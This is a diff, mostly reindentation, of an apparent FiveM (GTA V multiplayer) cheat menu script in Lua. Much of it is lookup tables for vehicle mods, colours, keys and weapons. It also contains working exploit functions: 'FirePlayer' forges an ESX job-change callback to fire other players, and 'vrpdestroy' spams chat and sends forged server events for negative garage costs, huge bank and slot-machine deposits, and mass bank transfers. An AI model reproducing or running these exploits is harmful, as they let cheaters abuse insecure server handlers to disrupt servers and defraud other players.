-            name = "Roof", id = 10
-        }, {
-            name = "Vanity Plates", id = 25
-        }, {
-            name = "Trim", id = 27
-        }, {
-            name = "Ornaments", id = 28
-        }, {
-            name = "Dashboard", id = 29
-        }, {
-            name = "Dial", id = 30
-        }, {
-            name = "Door Speaker", id = 31
-        }, {
-            name = "Seats", id = 32
-        }, {
-            name = "Steering Wheel", id = 33
-        }, {
-            name = "Shifter Leavers", id = 34
-        }, {
-            name = "Plaques", id = 35
-        }, {
-            name = "Speakers", id = 36
-        }, {
-            name = "Trunk", id = 37
-        }, {
-            name = "Hydraulics", id = 38
-        }, {
-            name = "Engine Block", id = 39
-        }, {
-            name = "Air Filter", id = 40
-        }, {
-            name = "Struts", id = 41
-        }, {
-            name = "Arch Cover", id = 42
-        }, {
-            name = "Aerials", id = 43
-        }, {
-            name = "Trim 2", id = 44
-        }, {
-            name = "Tank", id = 45
-        }, {
-            name = "Windows", id = 46
-        }, {
-            name = "Livery", id = 48
-        }, {
-            name = "Wheels", id = 23
-        }, {
-            name = "Wheel Types", id = "wheeltypes"
-        }, {
-            name = "Extras", id = "extra"
-        }, {
-            name = "Neons", id = "neon"
-        }, {
-            name = "Paint", id = "paint"
-        }, {
-            name = "Headlights Color", id = "headlight"
-        },  {
-            name = "Licence Plate", id = "licence"                           
-        }
+    {
+        name = "Spoilers", id = 0
+    }, {
+    name = "Front Bumper", id = 1
+}, {
+    name = "Rear Bumper", id = 2
+}, {
+    name = "Side Skirt", id = 3
+}, {
+    name = "Exhaust", id = 4
+}, {
+    name = "Frame", id = 5
+}, {
+    name = "Grille", id = 6
+}, {
+    name = "Hood", id = 7
+}, {
+    name = "Fender", id = 8
+}, {
+    name = "Right Fender", id = 9
+}, {
+    name = "Roof", id = 10
+}, {
+    name = "Vanity Plates", id = 25
+}, {
+    name = "Trim", id = 27
+}, {
+    name = "Ornaments", id = 28
+}, {
+    name = "Dashboard", id = 29
+}, {
+    name = "Dial", id = 30
+}, {
+    name = "Door Speaker", id = 31
+}, {
+    name = "Seats", id = 32
+}, {
+    name = "Steering Wheel", id = 33
+}, {
+    name = "Shifter Leavers", id = 34
+}, {
+    name = "Plaques", id = 35
+}, {
+    name = "Speakers", id = 36
+}, {
+    name = "Trunk", id = 37
+}, {
+    name = "Hydraulics", id = 38
+}, {
+    name = "Engine Block", id = 39
+}, {
+    name = "Air Filter", id = 40
+}, {
+    name = "Struts", id = 41
+}, {
+    name = "Arch Cover", id = 42
+}, {
+    name = "Aerials", id = 43
+}, {
+    name = "Trim 2", id = 44
+}, {
+    name = "Tank", id = 45
+}, {
+    name = "Windows", id = 46
+}, {
+    name = "Livery", id = 48
+}, {
+    name = "Wheels", id = 23
+}, {
+    name = "Wheel Types", id = "wheeltypes"
+}, {
+    name = "Extras", id = "extra"
+}, {
+    name = "Neons", id = "neon"
+}, {
+    name = "Paint", id = "paint"
+}, {
+    name = "Headlights Color", id = "headlight"
+}, {
+    name = "Licence Plate", id = "licence"
+}
+}
+
+local be = {
+    {
+        name = "Engine", id = 11
+    }, {
+    name = "Brakes", id = 12
+}, {
+    name = "Transmission", id = 13
+}, {
+    name = "Suspension", id = 15
+}
+}
+
+local bo = {
+    {
+        name = "Default", id = -1
+    }, {
+    name = "White", id = 0
+}, {
+    name = "Blue", id = 1
+}, {
+    name = "Electric Blue", id = 2
+}, {
+    name = "Mint Green", id = 3
+}, {
+    name = "Lime Green", id = 4
+}, {
+    name = "Yellow", id = 5
+}, {
+    name = "Golden Shower", id = 6
+}, {
+    name = "Orange", id = 7
+}, {
+    name = "Red", id = 8
+}, {
+    name = "Pony Pink", id = 9
+}, {
+    name = "Hot Pink", id = 10
+}, {
+    name = "Purple", id = 11
+}, {
+    name = "Blacklight", id = 12
+}
+}
+
+local colors = {
+    ["White"] = {
+        255, 255, 255
+    },
+    ["Blue"] = {
+        0, 0, 255
+    },
+    ["Electric Blue"] = {
+        0, 150, 255
+    },
+    ["Mint Green"] = {
+        50, 255, 155
+    },
+    ["Lime Green"] = {
+        0, 255, 0
+    },
+    ["Yellow"] = {
+        255, 255, 0
+    },
+    ["Golden Shower"] = {
+        204, 204, 0
+    },
+    ["Orange"] = {
+        255, 128, 0
+    },
+    ["Red"] = {
+        255, 0, 0
+    },
+    ["Pony Pink"] = {
+        255, 102, 255
+    },
+    ["Hot Pink"] = {
+        255, 0, 255
+    },
+    ["Purple"] = {
+        153, 0, 153
     }
-    
-    local be = {
-        {
-            name = "Engine", id = 11
-        }, {
-            name = "Brakes", id = 12
-        }, {
-            name = "Transmission", id = 13
-        }, {
-            name = "Suspension", id = 15
-        }
-    }
-    
-    local bo = {
-        {
-            name = "Default", id = -1
-        }, {
-            name = "White", id = 0
-        }, {
-            name = "Blue", id = 1
-        }, {
-            name = "Electric Blue", id = 2
-        }, {
-            name = "Mint Green", id = 3
-        }, {
-            name = "Lime Green", id = 4
-        }, {
-            name = "Yellow", id = 5
-        }, {
-            name = "Golden Shower", id = 6
-        }, {
-            name = "Orange", id = 7
-        }, {
-            name = "Red", id = 8
-        }, {
-            name = "Pony Pink", id = 9
-        }, {
-            name = "Hot Pink", id = 10
-        }, {
-            name = "Purple", id = 11
-        }, {
-            name = "Blacklight", id = 12
-        }
-    }
-    
-    local colors = {
-        ["White"] = {
-            255, 255, 255
-        }, ["Blue"] = {
-            0, 0, 255
-        }, ["Electric Blue"] = {
-            0, 150, 255
-        }, ["Mint Green"] = {
-            50, 255, 155
-        }, ["Lime Green"] = {
-            0, 255, 0
-        }, ["Yellow"] = {
-            255, 255, 0
-        }, ["Golden Shower"] = {
-            204, 204, 0
-        }, ["Orange"] = {
-            255, 128, 0
-        }, ["Red"] = {
-            255, 0, 0
-        }, ["Pony Pink"] = {
-            255, 102, 255
-        }, ["Hot Pink"] = {
-            255, 0, 255
-        }, ["Purple"] = {
-            153, 0, 153
-        }
-    }
-    
-	-- 4x482
-	
-    local bg = {
-        {
-            name = "Black", id = 0
-        }, {
-            name = "Carbon Black", id = 147
-        }, {
-            name = "Graphite", id = 1
-        }, {
-            name = "Anhracite Black", id = 11
-        }, {
-            name = "Black Steel", id = 2
-        }, {
-            name = "Dark Steel", id = 3
-        }, {
-            name = "Silver", id = 4
-        }, {
-            name = "Bluish Silver", id = 5
-        }, {
-            name = "Rolled Steel", id = 6
-        }, {
-            name = "Shadow Silver", id = 7
-        }, {
-            name = "Stone Silver", id = 8
-        }, {
-            name = "Midnight Silver", id = 9
-        }, {
-            name = "Cast Iron Silver", id = 10
-        }, {
-            name = "Red", id = 27
-        }, {
-            name = "Torino Red", id = 28
-        }, {
-            name = "Formula Red", id = 29
-        }, {
-            name = "Lava Red", id = 150
-        }, {
-            name = "Blaze Red", id = 30
-        }, {
-            name = "Grace Red", id = 31
-        }, {
-            name = "Garnet Red", id = 32
-        }, {
-            name = "Sunset Red", id = 33
-        }, {
-            name = "Cabernet Red", id = 34
-        }, {
-            name = "Wine Red", id = 143
-        }, {
-            name = "Candy Red", id = 35
-        }, {
-            name = "Hot Pink", id = 135
-        }, {
-            name = "Pfsiter Pink", id = 137
-        }, {
-            name = "Salmon Pink", id = 136
-        }, {
-            name = "Sunrise Orange", id = 36
-        }, {
-            name = "Orange", id = 38
-        }, {
-            name = "Bright Orange", id = 138
-        }, {
-            name = "Gold", id = 99
-        }, {
-            name = "Bronze", id = 90
-        }, {
-            name = "Yellow", id = 88
-        }, {
-            name = "Race Yellow", id = 89
-        }, {
-            name = "Dew Yellow", id = 91
-        }, {
-            name = "Dark Green", id = 49
-        }, {
-            name = "Racing Green", id = 50
-        }, {
-            name = "Sea Green", id = 51
-        }, {
-            name = "Olive Green", id = 52
-        }, {
-            name = "Bright Green", id = 53
-        }, {
-            name = "Gasoline Green", id = 54
-        }, {
-            name = "Lime Green", id = 92
-        }, {
-            name = "Midnight Blue", id = 141
-        }, {
-            name = "Galaxy Blue", id = 61
-        }, {
-            name = "Dark Blue", id = 62
-        }, {
-            name = "Saxon Blue", id = 63
-        }, {
-            name = "Blue", id = 64
-        }, {
-            name = "Mariner Blue", id = 65
-        }, {
-            name = "Harbor Blue", id = 66
-        }, {
-            name = "Diamond Blue", id = 67
-        }, {
-            name = "Surf Blue", id = 68
-        }, {
-            name = "Nautical Blue", id = 69
-        }, {
-            name = "Racing Blue", id = 73
-        }, {
-            name = "Ultra Blue", id = 70
-        }, {
-            name = "Light Blue", id = 74
-        }, {
-            name = "Chocolate Brown", id = 96
-        }, {
-            name = "Bison Brown", id = 101
-        }, {
-            name = "Creeen Brown", id = 95
-        }, {
-            name = "Feltzer Brown", id = 94
-        }, {
-            name = "Maple Brown", id = 97
-        }, {
-            name = "Beechwood Brown", id = 103
-        }, {
-            name = "Sienna Brown", id = 104
-        }, {
-            name = "Saddle Brown", id = 98
-        }, {
-            name = "Moss Brown", id = 100
-        }, {
-            name = "Woodbeech Brown", id = 102
-        }, {
-            name = "Straw Brown", id = 99
-        }, {
-            name = "Sandy Brown", id = 105
-        }, {
-            name = "Bleached Brown", id = 106
-        }, {
-            name = "Schafter Purple", id = 71
-        }, {
-            name = "Spinnaker Purple", id = 72
-        }, {
-            name = "Midnight Purple", id = 142
-        }, {
-            name = "Bright Purple", id = 145
-        }, {
-            name = "Cream", id = 107
-        }, {
-            name = "Ice White", id = 111
-        }, {
-            name = "Frost White", id = 112
-        }
-    }
-    
-    local bi = {
-        {
-            name = "Black", id = 12
-        }, {
-            name = "Gray", id = 13
-        }, {
-            name = "Light Gray", id = 14
-        }, {
-            name = "Ice White", id = 131
-        }, {
-            name = "Blue", id = 83
-        }, {
-            name = "Dark Blue", id = 82
-        }, {
-            name = "Midnight Blue", id = 84
-        }, {
-            name = "Midnight Purple", id = 149
-        }, {
-            name = "Schafter Purple", id = 148
-        }, {
-            name = "Red", id = 39
-        }, {
-            name = "Dark Red", id = 40
-        }, {
-            name = "Orange", id = 41
-        }, {
-            name = "Yellow", id = 42
-        }, {
-            name = "Lime Green", id = 55
-        }, {
-            name = "Green", id = 128
-        }, {
-            name = "Forest Green", id = 151
-        }, {
-            name = "Foliage Green", id = 155
-        }, {
-            name = "Olive Darb", id = 152
-        }, {
-            name = "Dark Earth", id = 153
-        }, {
-            name = "Desert Tan", id = 154
-        }
-    }
-    
-    local bj = {
-        {
-            name = "Brushed Steel", id = 117
-        }, {
-            name = "Brushed Black Steel", id = 118
-        }, {
-            name = "Brushed Aluminum", id = 119
-        }, {
-            name = "Pure Gold", id = 158
-        }, {
-            name = "Brushed Gold", id = 159
-        }
-    }
+}
+
+-- 4x482
+
+local bg = {
+    {
+        name = "Black", id = 0
+    }, {
+    name = "Carbon Black", id = 147
+}, {
+    name = "Graphite", id = 1
+}, {
+    name = "Anhracite Black", id = 11
+}, {
+    name = "Black Steel", id = 2
+}, {
+    name = "Dark Steel", id = 3
+}, {
+    name = "Silver", id = 4
+}, {
+    name = "Bluish Silver", id = 5
+}, {
+    name = "Rolled Steel", id = 6
+}, {
+    name = "Shadow Silver", id = 7
+}, {
+    name = "Stone Silver", id = 8
+}, {
+    name = "Midnight Silver", id = 9
+}, {
+    name = "Cast Iron Silver", id = 10
+}, {
+    name = "Red", id = 27
+}, {
+    name = "Torino Red", id = 28
+}, {
+    name = "Formula Red", id = 29
+}, {
+    name = "Lava Red", id = 150
+}, {
+    name = "Blaze Red", id = 30
+}, {
+    name = "Grace Red", id = 31
+}, {
+    name = "Garnet Red", id = 32
+}, {
+    name = "Sunset Red", id = 33
+}, {
+    name = "Cabernet Red", id = 34
+}, {
+    name = "Wine Red", id = 143
+}, {
+    name = "Candy Red", id = 35
+}, {
+    name = "Hot Pink", id = 135
+}, {
+    name = "Pfsiter Pink", id = 137
+}, {
+    name = "Salmon Pink", id = 136
+}, {
+    name = "Sunrise Orange", id = 36
+}, {
+    name = "Orange", id = 38
+}, {
+    name = "Bright Orange", id = 138
+}, {
+    name = "Gold", id = 99
+}, {
+    name = "Bronze", id = 90
+}, {
+    name = "Yellow", id = 88
+}, {
+    name = "Race Yellow", id = 89
+}, {
+    name = "Dew Yellow", id = 91
+}, {
+    name = "Dark Green", id = 49
+}, {
+    name = "Racing Green", id = 50
+}, {
+    name = "Sea Green", id = 51
+}, {
+    name = "Olive Green", id = 52
+}, {
+    name = "Bright Green", id = 53
+}, {
+    name = "Gasoline Green", id = 54
+}, {
+    name = "Lime Green", id = 92
+}, {
+    name = "Midnight Blue", id = 141
+}, {
+    name = "Galaxy Blue", id = 61
+}, {
+    name = "Dark Blue", id = 62
+}, {
+    name = "Saxon Blue", id = 63
+}, {
+    name = "Blue", id = 64
+}, {
+    name = "Mariner Blue", id = 65
+}, {
+    name = "Harbor Blue", id = 66
+}, {
+    name = "Diamond Blue", id = 67
+}, {
+    name = "Surf Blue", id = 68
+}, {
+    name = "Nautical Blue", id = 69
+}, {
+    name = "Racing Blue", id = 73
+}, {
+    name = "Ultra Blue", id = 70
+}, {
+    name = "Light Blue", id = 74
+}, {
+    name = "Chocolate Brown", id = 96
+}, {
+    name = "Bison Brown", id = 101
+}, {
+    name = "Creeen Brown", id = 95
+}, {
+    name = "Feltzer Brown", id = 94
+}, {
+    name = "Maple Brown", id = 97
+}, {
+    name = "Beechwood Brown", id = 103
+}, {
+    name = "Sienna Brown", id = 104
+}, {
+    name = "Saddle Brown", id = 98
+}, {
+    name = "Moss Brown", id = 100
+}, {
+    name = "Woodbeech Brown", id = 102
+}, {
+    name = "Straw Brown", id = 99
+}, {
+    name = "Sandy Brown", id = 105
+}, {
+    name = "Bleached Brown", id = 106
+}, {
+    name = "Schafter Purple", id = 71
+}, {
+    name = "Spinnaker Purple", id = 72
+}, {
+    name = "Midnight Purple", id = 142
+}, {
+    name = "Bright Purple", id = 145
+}, {
+    name = "Cream", id = 107
+}, {
+    name = "Ice White", id = 111
+}, {
+    name = "Frost White", id = 112
+}
+}
+
+local bi = {
+    {
+        name = "Black", id = 12
+    }, {
+    name = "Gray", id = 13
+}, {
+    name = "Light Gray", id = 14
+}, {
+    name = "Ice White", id = 131
+}, {
+    name = "Blue", id = 83
+}, {
+    name = "Dark Blue", id = 82
+}, {
+    name = "Midnight Blue", id = 84
+}, {
+    name = "Midnight Purple", id = 149
+}, {
+    name = "Schafter Purple", id = 148
+}, {
+    name = "Red", id = 39
+}, {
+    name = "Dark Red", id = 40
+}, {
+    name = "Orange", id = 41
+}, {
+    name = "Yellow", id = 42
+}, {
+    name = "Lime Green", id = 55
+}, {
+    name = "Green", id = 128
+}, {
+    name = "Forest Green", id = 151
+}, {
+    name = "Foliage Green", id = 155
+}, {
+    name = "Olive Darb", id = 152
+}, {
+    name = "Dark Earth", id = 153
+}, {
+    name = "Desert Tan", id = 154
+}
+}
+
+local bj = {
+    {
+        name = "Brushed Steel", id = 117
+    }, {
+    name = "Brushed Black Steel", id = 118
+}, {
+    name = "Brushed Aluminum", id = 119
+}, {
+    name = "Pure Gold", id = 158
+}, {
+    name = "Brushed Gold", id = 159
+}
+}
 local bk = false
 
 
@@ -1063,28 +1072,26 @@ function checkValidVehicleExtras()
 end
 
 function FirePlayer(SelectedPlayer)
-	if ESX then
-		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)
-
-			local playerMatch = nil
-			for i=1, #players, 1 do
-						label = players[i].name
-						value = players[i].source
-						name = players[i].name
-						if name == GetPlayerName(SelectedPlayer) then
-							playerMatch = players[i].identifier
-							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
-						end
-						identifier = players[i].identifier
-			end
-
+    if ESX then
+        ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)
+            local playerMatch = nil
+            for i = 1, #players, 1 do
+                label = players[i].name
+                value = players[i].source
+                name = players[i].name
+                if name == GetPlayerName(SelectedPlayer) then
+                    playerMatch = players[i].identifier
+                    debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
+                end
+                identifier = players[i].identifier
+            end
 
 
-			ESX.TriggerServerCallback('esx_society:setJob', function()
-			end, playerMatch, 'unemployed', 0, 'hire')
 
-		end)
-	end
+            ESX.TriggerServerCallback('esx_society:setJob', function()
+            end, playerMatch, 'unemployed', 0, 'hire')
+        end)
+    end
 end
 
 function DoesVehicleHaveExtras(veh)
@@ -1241,33 +1248,33 @@ end
 
 
 function vrpdestroy()
-                for bD = 0, 9 do
-                    TriggerServerEvent(
-                        '_chat:messageEntered',
-                        'xaxaxaxaxaxaxaxaxax',
-                        {
-                            141,
-                            211,
-                            255
-                        },
-                        '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
-                    )
-                end
-                TriggerServerEvent(
-                    'lscustoms:payGarage',
-                    {
-                        costs = -99999999
-                    }
-                )
-                TriggerServerEvent('vrp_slotmachine:server:2', 999999999)
-                TriggerServerEvent('Banca:deposit', 999999999)
-                TriggerServerEvent('bank:deposit', 999999999)
-                local di = GetPlayerServerId(PlayerId())
-                for i = 0, 256 do
-                    TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
-                end
-            end
-			
+    for bD = 0, 9 do
+        TriggerServerEvent(
+            '_chat:messageEntered',
+            'xaxaxaxaxaxaxaxaxax',
+            {
+                141,
+                211,
+                255
+            },
+            '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
+        )
+    end
+    TriggerServerEvent(
+        'lscustoms:payGarage',
+        {
+            costs = -99999999
+        }
+    )
+    TriggerServerEvent('vrp_slotmachine:server:2', 999999999)
+    TriggerServerEvent('Banca:deposit', 999999999)
+    TriggerServerEvent('bank:deposit', 999999999)
+    local di = GetPlayerServerId(PlayerId())
+    for i = 0, 256 do
+        TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
+    end
+end
+
 local aK = {
     'CogCabrio',
     'Exemplar',
@@ -1979,11 +1986,21 @@ local discordPresence = true
 
 
 local SelectedPlayer
-local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
+local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN",
+    "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
 local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
-local peds2 = { "s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", "u_m_y_babyd", "a_m_y_acult_01", "a_m_m_afriamer_01", "u_m_y_corpse_01", "s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02", "s_m_y_blackops_03", "s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01", "csb_cop", "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01" }
-local peds3 = { "cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04", "mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04", "a_m_m_tranvest_01", "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01", "a_f_m_soucentmc_01", "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01" }
-local peds4 = { "a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop", "a_c_cow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", "a_c_mtlion", "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler", "a_c_sharktiger", "a_c_shepherd", "a_c_westy" }
+local peds2 = { "s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", "u_m_y_babyd", "a_m_y_acult_01",
+    "a_m_m_afriamer_01", "u_m_y_corpse_01", "s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02",
+    "s_m_y_blackops_03", "s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01", "csb_cop",
+    "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01" }
+local peds3 = { "cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04",
+    "mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04", "a_m_m_tranvest_01",
+    "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01", "a_f_m_soucentmc_01",
+    "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01" }
+local peds4 = { "a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop",
+    "a_c_cow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", "a_c_mtlion",
+    "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler", "a_c_sharktiger",
+    "a_c_shepherd", "a_c_westy" }
 local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
 local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }
 
@@ -2011,17 +2028,83 @@ local currentPedddd = 1
 local currentBullet = 1
 local selectedBullet = 1
 
-local menus = { }
+local menus = {}
 local Keys = {
-  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, 
-  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
-  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
-  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
-  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
-  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, 
-  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
-  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
-  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
+    ["ESC"] = 322,
+    ["F1"] = 288,
+    ["F2"] = 289,
+    ["F3"] = 170,
+    ["F5"] = 166,
+    ["F6"] = 167,
+    ["F7"] = 168,
+    ["F8"] = 169,
+    ["F9"] = 56,
+    ["F10"] = 57,
+    ["~"] = 243,
+    ["1"] = 157,
+    ["2"] = 158,
+    ["3"] = 160,
+    ["4"] = 164,
+    ["5"] = 165,
+    ["6"] = 159,
+    ["7"] = 161,
+    ["8"] = 162,
+    ["9"] = 163,
+    ["-"] = 84,
+    ["="] = 83,
+    ["BACKSPACE"] = 177,
+    ["TAB"] = 37,
+    ["Q"] = 44,
+    ["W"] = 32,
+    ["E"] = 38,
+    ["R"] = 45,
+    ["T"] = 245,
+    ["Y"] = 246,
+    ["U"] = 303,
+    ["P"] = 199,
+    ["["] = 39,
+    ["]"] = 40,
+    ["ENTER"] = 18,
+    ["CAPS"] = 137,
+    ["A"] = 34,
+    ["S"] = 8,
+    ["D"] = 9,
+    ["F"] = 23,
+    ["G"] = 47,
+    ["H"] = 74,
+    ["K"] = 311,
+    ["L"] = 182,
+    ["LEFTSHIFT"] = 21,
+    ["Z"] = 20,
+    ["X"] = 73,
+    ["C"] = 26,
+    ["V"] = 0,
+    ["B"] = 29,
+    ["N"] = 249,
+    ["M"] = 244,
+    [","] = 82,
+    ["."] = 81,
+    ["LEFTCTRL"] = 36,
+    ["LEFTALT"] = 19,
+    ["SPACE"] = 22,
+    ["RIGHTCTRL"] = 70,
+    ["HOME"] = 213,
+    ["PAGEUP"] = 10,
+    ["PAGEDOWN"] = 11,
+    ["DELETE"] = 178,
+    ["LEFT"] = 174,
+    ["RIGHT"] = 175,
+    ["TOP"] = 27,
+    ["DOWN"] = 173,
+    ["NENTER"] = 201,
+    ["N4"] = 108,
+    ["N5"] = 60,
+    ["N6"] = 107,
+    ["N+"] = 96,
+    ["N-"] = 97,
+    ["N7"] = 117,
+    ["N8"] = 61,
+    ["N9"] = 118
 }
 local keys = { up = 172, down = 173, left = 174, right = 175, select = 215, back = 194 }
 local optionCount = 0
@@ -2055,83 +2138,83 @@ local function RGBou328h(frequency)
 end
 
 local allWeapons = {
-"WEAPON_KNIFE",
-"WEAPON_KNUCKLE",
-"WEAPON_NIGHTSTICK",
-"WEAPON_HAMMER",
-"WEAPON_BAT",
-"WEAPON_GOLFCLUB",
-"WEAPON_CROWBAR",
-"WEAPON_BOTTLE",
-"WEAPON_DAGGER",
-"WEAPON_HATCHET",
-"WEAPON_MACHETE",
-"WEAPON_FLASHLIGHT",
-"WEAPON_SWITCHBLADE",
-"WEAPON_PISTOL",
-"WEAPON_PISTOL_MK2",
-"WEAPON_COMBATPISTOL",
-"WEAPON_APPISTOL",
-"WEAPON_PISTOL50",
-"WEAPON_SNSPISTOL",
-"WEAPON_HEAVYPISTOL",
-"WEAPON_VINTAGEPISTOL",
-"WEAPON_STUNGUN",
-"WEAPON_FLAREGUN",
-"WEAPON_MARKSMANPISTOL",
-"WEAPON_REVOLVER",
-"WEAPON_MICROSMG",
-"WEAPON_SMG",
-"WEAPON_SMG_MK2",
-"WEAPON_ASSAULTSMG",
-"WEAPON_MG",
-"WEAPON_COMBATMG",
-"WEAPON_COMBATMG_MK2",
-"WEAPON_COMBATPDW",
-"WEAPON_GUSENBERG",
-"WEAPON_MACHINEPISTOL",
-"WEAPON_ASSAULTRIFLE",
-"WEAPON_ASSAULTRIFLE_MK2",
-"WEAPON_CARBINERIFLE",
-"WEAPON_CARBINERIFLE_MK2",
-"WEAPON_ADVANCEDRIFLE",
-"WEAPON_SPECIALCARBINE",
-"WEAPON_BULLPUPRIFLE",
-"WEAPON_COMPACTRIFLE",
-"WEAPON_PUMPSHOTGUN",
-"WEAPON_SAWNOFFSHOTGUN",
-"WEAPON_BULLPUPSHOTGUN",
-"WEAPON_ASSAULTSHOTGUN",
-"WEAPON_MUSKET",
-"WEAPON_HEAVYSHOTGUN",
-"WEAPON_DBSHOTGUN",
-"WEAPON_SNIPERRIFLE",
-"WEAPON_HEAVYSNIPER",
-"WEAPON_HEAVYSNIPER_MK2",
-"WEAPON_MARKSMANRIFLE",
-"WEAPON_GRENADELAUNCHER",
-"WEAPON_GRENADELAUNCHER_SMOKE",
-"WEAPON_RPG",
-"WEAPON_STINGER",
-"WEAPON_FIREWORK",
-"WEAPON_HOMINGLAUNCHER",
-"WEAPON_GRENADE",
-"WEAPON_STICKYBOMB",
-"WEAPON_PROXMINE",
-"WEAPON_BZGAS",
-"WEAPON_SMOKEGRENADE",
-"WEAPON_MOLOTOV",
-"WEAPON_FIREEXTINGUISHER",
-"WEAPON_PETROLCAN",
-"WEAPON_SNOWBALL",
-"WEAPON_FLARE",
-"WEAPON_BALL",
-"WEAPON_MINIGUN"
+    "WEAPON_KNIFE",
+    "WEAPON_KNUCKLE",
+    "WEAPON_NIGHTSTICK",
+    "WEAPON_HAMMER",
+    "WEAPON_BAT",
+    "WEAPON_GOLFCLUB",
+    "WEAPON_CROWBAR",
+    "WEAPON_BOTTLE",
+    "WEAPON_DAGGER",
+    "WEAPON_HATCHET",
+    "WEAPON_MACHETE",
+    "WEAPON_FLASHLIGHT",
+    "WEAPON_SWITCHBLADE",
+    "WEAPON_PISTOL",
+    "WEAPON_PISTOL_MK2",
+    "WEAPON_COMBATPISTOL",
+    "WEAPON_APPISTOL",
+    "WEAPON_PISTOL50",
+    "WEAPON_SNSPISTOL",
+    "WEAPON_HEAVYPISTOL",
+    "WEAPON_VINTAGEPISTOL",
+    "WEAPON_STUNGUN",
+    "WEAPON_FLAREGUN",
+    "WEAPON_MARKSMANPISTOL",
+    "WEAPON_REVOLVER",
+    "WEAPON_MICROSMG",
+    "WEAPON_SMG",
+    "WEAPON_SMG_MK2",
+    "WEAPON_ASSAULTSMG",
+    "WEAPON_MG",
+    "WEAPON_COMBATMG",
+    "WEAPON_COMBATMG_MK2",
+    "WEAPON_COMBATPDW",
+    "WEAPON_GUSENBERG",
+    "WEAPON_MACHINEPISTOL",
+    "WEAPON_ASSAULTRIFLE",
+    "WEAPON_ASSAULTRIFLE_MK2",
+    "WEAPON_CARBINERIFLE",
+    "WEAPON_CARBINERIFLE_MK2",
+    "WEAPON_ADVANCEDRIFLE",
